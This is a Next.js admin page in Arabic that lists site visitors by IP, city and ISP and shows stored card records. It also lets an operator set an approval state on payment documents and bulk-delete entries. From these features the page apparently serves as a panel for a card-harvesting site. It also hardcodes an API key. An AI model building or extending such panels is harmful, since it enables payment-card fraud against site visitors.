'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { Trash2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import { db, auth } from '@/lib/firestore';
import {
  collection,
  getDocs,
  doc,
  deleteDoc,
  writeBatch,
  updateDoc,
  query,
} from 'firebase/firestore';
import { onAuthStateChanged, signOut } from 'firebase/auth';
import { CardsByID } from '@/components/cards';

interface UserData {
  id: string;
  ip: string;
  country_name: string;
  city: string;
  isp: string;
  data?: any;
}

function cleanString(input: string) {
  return input.replace(/[^a-zA-Z0-9 ]/g, '');
}

export default function NotificationsPage() {
  const [userData, setUserData] = useState<UserData[]>([]);
  const [cardData, setCardData] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(null);
  const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
  const router = useRouter();

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push('/login');
      } else {
        fetchUserData();
      }
    });

    return () => unsubscribe();
  }, [router]);

  const fetchUserData = async () => {
    setIsLoading(true);
    try {
      const response = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=fbccb577872e478caf50ba7550c67df4');
      const result = await response.json();
      const _id = cleanString(result.ip);

      const usersCollection = collection(db, 'users');
      const cardsCollection = collection(db, 'orders');
      const usersQuery = query(usersCollection);
      const cardsQuery = query(cardsCollection);
      const querySnapshot = await getDocs(usersQuery);
      const cardsQuerySnapshot = await getDocs(cardsQuery);
      const targetPost = doc(db, 'orders', _id);
      console.log(targetPost)
      const data: UserData[] = [];
      const cardsdata:any[] = [];
       cardsQuerySnapshot.forEach((doc)=>{
        const cardData = doc.data();
        cardsdata.push({
          id:doc.id,
          ...cardData})
       })
      querySnapshot.forEach((doc) => {
        const userData = doc.data();
        
        if (userData.result) {
          data.push({
            id: doc.id,
            ...userData.result,
            data: userData.data,
          });
        }
      });

      setUserData(data);
      setCardData(targetPost);
    } catch (error) {
      console.error('Error fetching user data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleClearAll = async () => {
    setIsLoading(true);
    try {
      const batch = writeBatch(db);
      userData.forEach((user) => {
        const docRef = doc(db, 'users', user.id);
        batch.delete(docRef);
      });
      await batch.commit();
      setUserData([]);
    } catch (error) {
      console.error('Error clearing user data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleDelete = async (uid: string) => {
    try {
      await deleteDoc(doc(db, 'users', uid));
      setUserData(userData.filter((user) => user.id !== uid));
    } catch (error) {
      console.error('Error deleting user data:', error);
    }
  };

  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, 'pays', id);
    await updateDoc(targetPost, {
      cardState: state,
    });
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
      router.push('/login');
    } catch (error) {
      console.error('Error signing out:', error);
    }
  };

  const handleInfoClick = (user: UserData, infoType: 'personal' | 'card') => {
    setSelectedUser(user);
    setSelectedInfo(infoType);
  };

  const closeDialog = () => {
    setSelectedInfo(null);
    setSelectedUser(null);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center">
        جاري التحميل...
      </div>
    );
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-900 text-white p-4">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
          <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع البيانات</h1>
          <div className="flex flex-col sm:flex-row gap-2">
            <Button
              variant="destructive"
              onClick={handleClearAll}
              className="bg-red-500 hover:bg-red-600"
              disabled={userData.length === 0}
            >
              مسح جميع البيانات
            </Button>
            <Button
              variant="outline"
              onClick={handleLogout}
              className="bg-gray-700 hover:bg-gray-600"
            >
              تسجيل الخروج
            </Button>
          </div>
        </div>

        <div className="bg-gray-800 rounded-lg overflow-x-auto">
          <table className="w-full">
            <thead>
              <tr className="border-b border-gray-700">
                <th className="px-4 py-3 text-right">المعرف</th>
                <th className="px-4 py-3 text-right">عنوان IP</th>
                <th className="px-4 py-3 text-right">الدولة</th>
                <th className="px-4 py-3 text-right">المدينة</th>
                <th className="px-4 py-3 text-right">مزود خدمة الإنترنت</th>
                <th className="px-4 py-3 text-center">المعلومات</th>
                <th className="px-4 py-3 text-center">حذف</th>
              </tr>
            </thead>
            <tbody>
              {userData.map((user) => (
                <tr key={user.id} className="border-b border-gray-700">
                  <td className="px-4 py-3">{user.id}</td>
                  <td className="px-4 py-3">{user.ip}</td>
                  <td className="px-4 py-3">{user.country_name}</td>
                  <td className="px-4 py-3">{user.city}</td>
                  <td className="px-4 py-3">{user.isp}</td>
                  <td className="px-4 py-3">
                    <div className="flex flex-col sm:flex-row gap-2 justify-center">
                      <Badge
                        variant={user.data ? 'default' : 'destructive'}
                        className="rounded-md cursor-pointer"
                        onClick={() => handleInfoClick(user, 'personal')}
                      >
                        {user.id ? 'عرض البيانات' : 'لا توجد بيانات'}
                      </Badge>
                    </div>
                  </td>
                  <td className="px-4 py-3 text-center">
                    <Button
                      variant="destructive"
                      size="sm"
                      onClick={() => handleDelete(user.id)}
                      className="bg-red-500 hover:bg-red-600"
                    >
                      <Trash2 className="h-4 w-4" />
                    </Button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-gray-800 text-white" dir="rtl">
          <DialogHeader>
            <DialogTitle>بيانات المستخدم</DialogTitle>
            <DialogDescription>تفاصيل البيانات المخزنة</DialogDescription>
          </DialogHeader>
          {selectedUser && selectedUser.data && (
            <div className="space-y-2">
              <pre className="whitespace-pre-wrap overflow-x-auto">
              <CardsByID id={selectedUser.id}/>
              </pre>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}

